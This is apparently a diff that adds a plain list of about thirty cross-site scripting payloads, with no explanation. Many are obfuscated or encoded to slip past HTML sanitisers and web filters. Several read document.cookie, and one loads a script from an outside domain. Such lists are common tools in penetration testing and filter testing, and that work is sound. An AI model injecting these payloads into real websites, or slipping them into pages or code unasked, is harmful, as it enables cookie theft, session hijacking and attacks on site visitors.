@@ -1,0 +1,30 @@
+<script>alert(1)</script>
+<img src="x" onerror="alert(1)">
+<svg/onload=alert(1)>
+%00<script>alert("xss")</script>
+<button%20popovertarget=x >Click%20me</button>
+<button onclick=alert(1) >Click%20me</button>
+<script>alert()</script>
+1'"<S><A HRef=tel:/%26apos;;/%26quot;;/%26lt;s%26gt;%26lt;Img/Src//O%26%2378;Error=alert(1)//%26gt; Title=tel:/%26apos;;/%26quot;;/%26lt;s%26gt;%26lt;Img/Src//O%26%2378;Error=alert(1)//%26gt; Alt=tel:/%26apos;;/%26quot;;/%26lt;s%26gt;%26lt;Img/Src//O%26%2378;Error=alert(1)//%26gt; Name=tel:/%26apos;;/%26quot;;/%26lt;s%26gt;%26lt;Img/Src//O%26%2378;Error=alert(1)//%26gt; Class=tel:/%26apos;;/%26quot;;/%26lt;s%26gt;%26lt;Img/Src//O%26%2378;Error=alert(1)//%26gt;>
+<img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+<Img/Src/OnError=alert(1)>
+<iframe src=javasc&#x72ipt:alert(1) >
+<img src=javascript:alert(1) />
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
+<img src=img.png onload=prompt(1)>
+` '%3balert(String.fromCharCode(88,83,83))%2f%2f'%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f--><%2fSCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) <%2fSCRIPT> `
+<JavaScript:"\74Svg\57OnLoad\75\141\154\145\162\164\501\51\76"/ContentEditable/AutoFocus/OnFocus=location=tagName>
+<!--%26gt;<TextArea><!--><Script>//</TextArea>//alert(1)</Script>
+10</option></select><img/src=xon=()onx+honerror=alert(1)>ss
+<svg/onload=prompt(document.cookie)%20>
+%22%3EEnter_Mouse_Pointer_Here_to_get_XSS%3C%5K/onpointerenter=alert(location)%3E%3!–
+<svg onload=alert&#00000000040document.cookie)>
+<teste onmouseover=alert()>aaaaaa</teste>
+”;var%20a=3;if(a==3){alert(document.cookie);}//
+testtest”+onmouseover%3D”alert%26%230000000040%3Bdocument[‘cookie’])
+<script/src=//⑮.rs>
+<i/oncut=alert()> (CTRL +X )
+<svg/onload=alert()
+<img src="x" onerror="eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))">
+<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>
+<00 foo="a%20href="javascript:alert('XSS BYPASS')">Click</00--%20/
